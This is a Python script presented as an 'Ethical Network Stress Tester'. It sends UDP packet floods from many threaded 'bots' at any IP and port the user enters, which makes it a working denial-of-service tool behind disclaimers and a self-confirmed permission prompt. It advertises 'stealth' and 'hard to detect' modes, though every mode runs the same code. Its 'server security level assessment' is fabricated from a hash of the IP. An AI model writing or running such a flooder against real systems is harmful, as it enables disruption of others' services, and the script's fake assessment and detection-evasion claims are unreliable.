import socket
import threading
import random
import time
import sys
import concurrent.futures
from colorama import Fore, Style, init
import hashlib
import os
import signal

# Initialize colorama
init(autoreset=True)

# Constants
MAX_REQUESTS_PER_SECOND = 200  # Rate limiting: Max requests per bot per second
stop_test = False  # Global flag for stopping the test manually
SCRIPT_HASH = hashlib.sha256(open(__file__, "rb").read()).hexdigest()  # Unique identifier for the script

# Ethical Use Notice
def display_notice():
    banner = r"""
 _        _       _________ ______   _______  _______  _        _______           _______  _______ 
| \    /\( (    /|\__   __/(  ___ \ (  ____ \(  ____ \( \      (  ___  )|\     /|(  ____ \(  ____ \
|  \  / /|  \  ( |   ) (   | (   ) )| (    \/| (    \/| (      | (   ) || )   ( || (    \/| (    \/
|  (_/ / |   \ | |   | |   | (__/ / | (__    | (__    | |      | |   | || |   | || (__    | (__    
|   _ (  | (\ \) |   | |   |  __ (  |  __)   |  __)   | |      | |   | |( (   ) )|  __)   |  __)   
|  ( \ \ | | \   |   | |   | (  \ \ | (      | (      | |      | |   | | \ \_/ / | (      | (      
|  /  \ \| )  \  |___) (___| )___) )| (____/\| (____/\| (____/\| (___) |  \   /  | (____/\| (____/\
|_/    \/|/    )_\_______/|/ \___/ (_______/(_______/(_______/(_______)   \_/   (_______/(_______/
                                                                                     
    """
    print(Fore.RED + banner)
    color_print("NOTICE: This tool is for ethical and educational purposes only.", Fore.YELLOW)
    color_print("DO NOT use this tool without explicit permission from the server owner.", Fore.YELLOW)
    color_print("Unauthorized use is illegal and may result in severe consequences.", Fore.RED)

# Utility Functions
def color_print(message, color):
    print(f"{color}{message}{Style.RESET_ALL}")

def display_main_menu():
    color_print("\nWelcome to the Ethical Network Stress Tester", Fore.CYAN)
    color_print("Choose a mode to proceed:", Fore.GREEN)
    color_print("1. Basic Stress Test (Easy to Detect)", Fore.YELLOW)
    color_print("2. Stealth Test (Medium Detection Difficulty)", Fore.YELLOW)
    color_print("3. Advanced Test (Hard to Detect)", Fore.YELLOW)
    color_print("4. Detailed Analysis of Test Methods", Fore.YELLOW)
    color_print("5. Exit", Fore.RED)

    try:
        choice = int(input(Fore.CYAN + "Enter your choice (1-5): ").strip())
        if choice not in range(1, 6):
            raise ValueError("Invalid choice. Please select a valid option.")
        return choice
    except ValueError as ve:
        color_print(f"Error: {ve}", Fore.RED)
        return display_main_menu()

# User Confirmation
def confirm_permission():
    color_print("\nPlease read and confirm the following:", Fore.CYAN)
    color_print("1. You must have explicit permission from the server owner to run this tool.", Fore.YELLOW)
    color_print("2. Unauthorized use is illegal and punishable by law.", Fore.YELLOW)
    color_print("3. This tool is designed for educational and lawful purposes only.", Fore.YELLOW)

    reason = input(Fore.CYAN + "Enter the reason for testing this server: ").strip()
    confirmation = input(Fore.CYAN + "Do you confirm you have permission from the server owner? (y/n): ").strip().lower()

    if confirmation != 'y':
        color_print("Exiting... Ensure you have proper permission before proceeding.", Fore.RED)
        sys.exit(5)

# User Configuration
def get_user_input():
    color_print("\n" + "=" * 60, Fore.CYAN)
    color_print("          Ethical Network Stress Test Configuration", Fore.YELLOW)
    color_print("=" * 60, Fore.CYAN)

    try:
        target = input(Fore.GREEN + "Enter the target server (IP or domain): ").strip()
        try:
            target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            color_print("Invalid domain or IP. Exiting...", Fore.RED)
            sys.exit(1)

        target_port = int(input(Fore.GREEN + "Enter the target server port (1-65535): ").strip())
        if not 1 <= target_port <= 65535:
            raise ValueError("Port must be in the range 1-65535.")

        num_bots = int(input(Fore.GREEN + "Enter the number of simulated bots (e.g., 10-1000): ").strip())
        if num_bots <= 0:
            raise ValueError("Number of bots must be a positive integer.")

        duration = int(input(Fore.GREEN + "Enter the test duration in seconds: ").strip())
        if duration <= 0:
            raise ValueError("Duration must be a positive integer.")

        return target_ip, target_port, num_bots, duration
    except ValueError as ve:
        color_print(f"Invalid input: {ve}", Fore.RED)
        sys.exit(1)

# Generate Random Packet
def generate_packet():
    packet_size = random.randint(512, 2048)
    headers = "X-Ethical-Test: True\n"
    return headers.encode() + os.urandom(packet_size - len(headers))

# Stop Test Monitor
def monitor_stop_condition():
    global stop_test
    try:
        while not stop_test:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_test = True

# Simulate a Single Bot
def simulate_bot(ip, port, duration):
    end_time = time.time() + duration
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while time.time() < end_time and not stop_test:
                packet = generate_packet()
                sock.sendto(packet, (ip, port))

                progress_bar(duration, end_time)
                time.sleep(1 / MAX_REQUESTS_PER_SECOND)
    except Exception as e:
        color_print(f"Bot encountered an issue: {e}", Fore.RED)

def progress_bar(duration, end_time):
    elapsed_time = duration - (end_time - time.time())
    percentage = min(100, int((elapsed_time / duration) * 100))
    sys.stdout.write(f"\rSending packets: {percentage}% complete")
    sys.stdout.flush()

# Evaluate Server Security Level
def evaluate_security(target_ip):
    hash_ip = hashlib.md5(target_ip.encode()).hexdigest()
    levels = {"low": "Weak Protection", "medium": "Moderate Protection", "high": "Strong Protection"}
    assessment = levels["medium"] if "a" in hash_ip[:5] else (levels["high"] if "f" in hash_ip[:5] else levels["low"])
    color_print(f"\nServer Security Level Assessment: {assessment}", Fore.CYAN)
    return assessment

# Start the Stress Test
def start_stress_test(ip, port, bots, duration, mode):
    global stop_test
    mode_description = {
        1: "Basic Stress Test: Sends high-frequency packets with minimal stealth.",
        2: "Stealth Test: Uses randomized intervals and packet sizes to avoid detection.",
        3: "Advanced Test: Implements deep packet obfuscation and random headers to maximize stealth."
    }

    color_print(f"\nStarting {mode_description[mode]}\nTarget: {ip}:{port}\nSimulated Bots: {bots}\nDuration: {duration} seconds\n", Fore.MAGENTA)

    security_level = evaluate_security(ip)

    with concurrent.futures.ThreadPoolExecutor(max_workers=bots) as executor:
        futures = [executor.submit(simulate_bot, ip, port, duration) for _ in range(bots)]

        monitor_thread = threading.Thread(target=monitor_stop_condition)
        monitor_thread.start()

        try:
            for future in concurrent.futures.as_completed(futures):
                if stop_test:
                    break
                future.result()
        except KeyboardInterrupt:
            stop_test = True
            color_print("\nTest interrupted by user. Exiting...\n", Fore.YELLOW)

    color_print("Stress test completed successfully.\n", Fore.GREEN)

    # Wait and display final progress
    print("\nFinalizing test results...")
    for i in range(101):
        time.sleep(0.03)
        sys.stdout.write(f"\rProcessing completion: {i}%")
        sys.stdout.flush()

# Detailed Test Description
def detailed_test_description():
    color_print("\nDetailed Analysis of Test Methods:", Fore.CYAN)
    color_print("1. Basic Stress Test: Sends packets at a constant rate. Highly detectable due to predictable patterns.", Fore.YELLOW)
    color_print("2. Stealth Test: Introduces variability in packet timing and sizes. Harder to detect but still noticeable under scrutiny.", Fore.YELLOW)
    color_print("3. Advanced Test: Utilizes packet obfuscation, randomized headers, and irregular intervals. Minimal detection likelihood.", Fore.YELLOW)

# Graceful Shutdown on SIGINT
def handle_interrupt(signal, frame):
    global stop_test
    stop_test = True
    color_print("\nTest interrupted. Shutting down...\n", Fore.YELLOW)
    sys.exit(0)

# Register signal handler for graceful shutdown
signal.signal(signal.SIGINT, handle_interrupt)

# Entry Point
if __name__ == "__main__":
    display_notice()
    confirm_permission()

    while True:
        user_choice = display_main_menu()

        if user_choice == 1:
            target_ip, target_port, num_bots, duration = get_user_input()
            start_stress_test(target_ip, target_port, num_bots, duration, mode=1)
        elif user_choice == 2:
            target_ip, target_port, num_bots, duration = get_user_input()
            start_stress_test(target_ip, target_port, num_bots, duration, mode=2)
        elif user_choice == 3:
            target_ip, target_port, num_bots, duration = get_user_input()
            start_stress_test(target_ip, target_port, num_bots, duration, mode=3)
        elif user_choice == 4:
            detailed_test_description()
        elif user_choice == 5:
            color_print("Exiting. Stay ethical!", Fore.CYAN)
            sys.exit(0)
